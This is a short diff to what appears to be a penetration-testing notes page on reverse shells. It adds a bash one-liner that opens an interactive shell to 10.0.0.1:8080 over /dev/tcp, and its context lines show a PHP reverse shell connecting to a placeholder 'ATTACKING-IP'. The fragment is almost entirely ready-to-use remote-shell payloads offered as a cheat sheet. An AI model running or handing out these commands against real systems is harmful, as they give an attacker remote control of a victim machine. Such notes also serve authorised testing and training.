@@ -22,6 +22,10 @@ There is more info on this topic in the metasploit chapter in /exploiting. But h
 exec /bin/bash 0&0 2>&0
 ```
 
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
 ## Php
 ```
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
